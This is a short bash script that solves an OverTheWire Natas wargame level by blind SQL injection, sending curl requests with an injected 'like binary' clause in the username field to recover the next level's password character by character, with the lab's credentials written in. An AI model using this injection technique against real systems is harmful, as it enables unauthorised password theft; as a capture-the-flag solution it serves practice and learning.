alphabet='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
currentpw=''

for i in {0..1000}; do
    trying=${alphabet:${i}%62:1};
    isinside=$(curl -s --user natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J \
        -d username=natas16%22+and+password+like+binary+%22${currentpw}${trying}%25 \
        http://natas15.natas.labs.overthewire.org |
        grep -i 'this user exists');
    if [[ ! -z "$isinside" ]]; then currentpw+="${trying}"; echo "[+]${currentpw}"; fi
done
